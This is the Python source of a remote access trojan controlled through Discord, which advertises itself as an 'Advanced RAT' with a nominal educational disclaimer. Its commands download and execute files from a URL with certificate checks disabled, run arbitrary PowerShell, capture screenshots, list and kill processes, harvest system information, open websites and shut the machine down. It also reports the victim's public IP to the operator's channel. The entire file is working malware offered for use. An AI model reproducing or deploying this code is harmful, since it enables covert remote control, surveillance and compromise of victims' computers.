import asyncio
import os
import subprocess
import sys
import time
import urllib.parse
import urllib.request

import cv2
import webbrowser
import psutil
import discord
from discord.ext import commands
from dotenv import load_dotenv
import io
import pyautogui
import requests
import ssl


intents = discord.Intents.default()
intents.typing = False
intents.presences = False
intents.guild_messages = True

bot = commands.Bot(command_prefix='!', intents=intents)

# Load environment variables from .env file
load_dotenv()

async def on_ready():
    # Retrieve the BOT_ACTIVITY environment variable
    bot_activity = os.getenv('BOT_ACTIVITY')

    # Set the bot's activity
    activity = discord.Activity(type=discord.ActivityType.listening, name=bot_activity)
    await bot.change_presence(activity=activity)

# Command : Set Payload 
@bot.command()
async def set_payload(ctx, url: str):
    try:
        parsed_url = urllib.parse.urlparse(url)
        filename = os.path.basename(parsed_url.path)

        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE

        max_retry_attempts = 3
        retry_delay = 2

        for attempt in range(1, max_retry_attempts + 1):
            try:
                response = requests.get(url, verify=False)
                response.raise_for_status()
                content = response.content
                break

            except (requests.RequestException, IOError) as e:
                await ctx.send(f'Error downloading the file: {str(e)}. Retrying in {retry_delay} seconds...')
                time.sleep(retry_delay)

                if attempt == max_retry_attempts:
                    await ctx.send('Maximum number of retry attempts reached. Unable to download the file.')
                    return

        home_dir = os.path.expanduser("~")
        downloads_folder = os.path.join(home_dir, "Downloads")
        file_path = os.path.join(downloads_folder, filename)
        
        with open(file_path, 'wb') as file:
            file.write(content)

        await ctx.send(f'File downloaded successfully to {file_path}.')

        command = f'start-process -FilePath "{file_path}"'
        subprocess.run(['powershell.exe', '-Command', command], shell=True)

        await ctx.send('File installed and executed.')

        await asyncio.sleep(10)

        os.remove(file_path)

        await ctx.send('File deleted permanently.')

    except Exception as e:
        await ctx.send(f'Error: {str(e)}')

@bot.command(name='info')
async def bot_info(ctx):
    info_message = """
    **Bot Information :**
```🤖 Advanced RAT Written In Python Language, Fully Controllable Through Discord With Dedicated GUI Builder.```
```🕵️ Spy Mode: It provides real-time notifications on user activities and credentials leaks.```
```🔒 Encryption: Encrypt the connection with the target, making it secure and undetectable.```
```⏱️ Task Scheduler: Schedule specific tasks for a future execution on the target machine.```
```🌐 Network Management: Manage and control multiple targets in a single interface. Create, edit and delete targets on the go.```
```📊 User-Friendly: User-friendly interface with detailed information about targets and features.```
```🔧 Extensibility: Easily extendable with custom plugins for new features and functionality.```
```⚠️ Disclaimer: This code is intended for educational purposes only and should not be used for any malicious activities. The author is not responsible for any consequences resulting from the misuse of this code.```
    """
    await ctx.send(info_message)

# Command : Clear
@bot.command()
async def clear(ctx, amount=5):
    await ctx.channel.purge(limit=amount)

@bot.command(name='bot_help')
async def bot_help(ctx):
    help_message = """
    ```Available Commands:

!info - Display information about the bot
!bot_help - Display this help message
!clear [amount] - Clear a specified number of messages in the channel (default: 5)
!contact - Send feedback to the developer
!set_payload <URL> - Download and execute a file from the provided URL
!powershell - Execute a PowerShell command on the target machine
!screenshot - Take a screenshot of the target machine's screen
!list_process - Get a list of running processes on the target machine
!kill_process <name> - Kill a specified process on the target machine
!sys_info - Get information about the target machine's operating system
!open_website <URL> - Open a specified URL on the target machine
```
``` For More Feature Upgrade To The Premium Version```
    """
    await ctx.send(help_message)

# Command : Powershell
@bot.command()
async def powershell(ctx, *, command: str):
    try:
        powershell_command = f'powershell.exe -Command "{command}"'
        output = subprocess.check_output(powershell_command, shell=True, stderr=subprocess.STDOUT, timeout=10)
        output = output.decode('utf-8')

        # Split the output into chunks of maximum 2000 characters
        chunks = [output[i:i + 2000] for i in range(0, len(output), 2000)]
        for chunk in chunks:
            await ctx.send(f'{chunk}')
    except subprocess.CalledProcessError as e:
        await ctx.send(f'Error executing PowerShell command: {e.output.decode("utf-8")}')
    except subprocess.TimeoutExpired:
        await ctx.send('The PowerShell command timed out.')


# Command: Screenshot
@bot.command()
async def screenshot(ctx):
    global command_count
    if 'command_count' not in globals():
        command_count = {}

    # Check if the user is already restricted
    if ctx.author.id in command_count and command_count[ctx.author.id] >= 5:
        await ctx.send("You have reached the command usage limit. Please upgrade to the premium version.")
        return

    # Take a screenshot of the screen
    screenshot = pyautogui.screenshot()

    # Convert the screenshot to bytes
    img_bytes = io.BytesIO()
    screenshot.save(img_bytes, format='PNG')
    img_bytes.seek(0)

    # Send the screenshot as an attachment in Discord
    picture = discord.File(img_bytes, filename='spyshot.png')
    await ctx.send(file=picture)

    # Update the command usage count for the user
    if ctx.author.id not in command_count:
        command_count[ctx.author.id] = 1
    else:
        command_count[ctx.author.id] += 1

# Command : List Process
@bot.command()
async def list_process(ctx):
    try:
        process_list = psutil.process_iter()
        processes = [p.name() for p in process_list]

        if processes:
            process_chunks = [processes[i:i + 20] for i in range(0, len(processes), 20)]
            for chunk in process_chunks:
                process_str = '\n'.join(chunk)
                await ctx.send(f'List of running processes:\n```{process_str}```')
        else:
            await ctx.send('No processes found.')

    except Exception as e:
        await ctx.send(f'Error listing processes: {str(e)}')

# Command : Kill Process
@bot.command()
async def kill_process(ctx, name: str):
    try:
        if sys.platform == 'win32':
            process = subprocess.run(['taskkill', '/F', '/IM', name], capture_output=True)
        else:
            process = subprocess.run(['killall', name], capture_output=True)

        if process.returncode == 0:
            await ctx.send(f'Process {name} killed.')
        else:
            error_output = process.stderr.decode().strip()
            await ctx.send(f'Error killing process: {error_output}')

    except Exception as e:
        await ctx.send(f'Error killing process: {str(e)}')


def get_value_by_label(label, output):
    label = label + ":"
    lines = output.splitlines()
    for line in lines:
        if line.startswith(label):
            return line.split(label)[1].strip()
    return None

def get_os_version(output):
    return get_value_by_label("OS Version", output)

def get_os_manufacturer(output):
    return get_value_by_label("OS Manufacturer", output)

def get_os_configuration(output):
    return get_value_by_label("OS Configuration", output)

def get_os_build_type(output):
    return get_value_by_label("OS Build Type", output)

def get_registered_owner(output):
    return get_value_by_label("Registered Owner", output)

def get_registered_organization(output):
    return get_value_by_label("Registered Organization", output)

def get_product_id(output):
    return get_value_by_label("Product ID", output)

def get_original_install_date(output):
    return get_value_by_label("Original Install Date", output)

def get_system_boot_time(output):
    return get_value_by_label("System Boot Time", output)

# Command : System Info
@bot.command()
async def sys_info(ctx):
    try:
        os_info = subprocess.run(
            'powershell.exe systeminfo', 
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            text=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        ).stdout
    except FileNotFoundError:
        await ctx.send("The 'systeminfo' command is not available on this system.")
        return

    os_version = get_os_version(os_info)
    os_manufacturer = get_os_manufacturer(os_info)
    os_configuration = get_os_configuration(os_info)
    os_build_type = get_os_build_type(os_info)
    registered_owner = get_registered_owner(os_info)
    registered_organization = get_registered_organization(os_info)
    product_id = get_product_id(os_info)
    original_install_date = get_original_install_date(os_info)
    system_boot_time = get_system_boot_time(os_info)


    info_message = f"OS Version: {os_version}\n" \
                   f"OS Manufacturer: {os_manufacturer}\n" \
                   f"OS Configuration: {os_configuration}\n" \
                   f"OS Build Type: {os_build_type}\n" \
                   f"Registered Owner: {registered_owner}\n" \
                   f"Registered Organization: {registered_organization}\n" \
                   f"Product ID: {product_id}\n" \
                   f"Original Install Date: {original_install_date}\n" \
                   f"System Boot Time: {system_boot_time}\n" \

         # Split the message into smaller parts if it exceeds the character limit
    messages = []
    while len(info_message) > 0:
        messages.append(info_message[:2000])
        info_message = info_message[2000:]

    for message in messages:
        code_block_message = f"```{message}```"  # Send As A Box
        await ctx.send(code_block_message)

# Command : Open Website 
@bot.command()
async def open_website(ctx, url: str):
    try:
        webbrowser.open(url)
        await ctx.send(f'Opening website: {url}')

    except Exception as e:
        await ctx.send(f'Error opening website: {str(e)}')

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return
    
    if message.content.startswith('!contact'):
        owner = await bot.fetch_user(992076440260587631) # Developer Id (send feedbacks to developer)
        contact_message = message.content[9:]
        
        # Send a direct message to the bot owner
        await owner.send(f"New message from {message.author.name}#{message.author.discriminator}:\n{contact_message}")
        
        await message.channel.send("Your message has been sent to the bot owner.")
    
    await bot.process_commands(message)

# Command: System Shutdown
@bot.command()
async def sys_shutdown(ctx):
    await ctx.send("Shutting down...")
    await bot.logout()
    subprocess.call("shutdown /s /t 0", shell=True)

# Function to send a system active message
async def send_system_active_message():
    await bot.wait_until_ready()

    # Get channel and guild IDs from environment variables
    guild_id = int(os.getenv('GUILD_ID'))
    channel_id = int(os.getenv('CHANNEL_ID'))

    guild = bot.get_guild(guild_id)
    channel = guild.get_channel(channel_id)

    try:
        response = requests.get('https://api.ipify.org?format=json') # Fetch Public Ip
        ip = response.json()['ip']
        message = f"System is active. Public IP: {ip}"
        await channel.send(message)
    except Exception as e:
        print(f"Error sending system active message: {e}")

bot.run(os.getenv('BOT_TOKEN')) # Use the bot token from environment variable
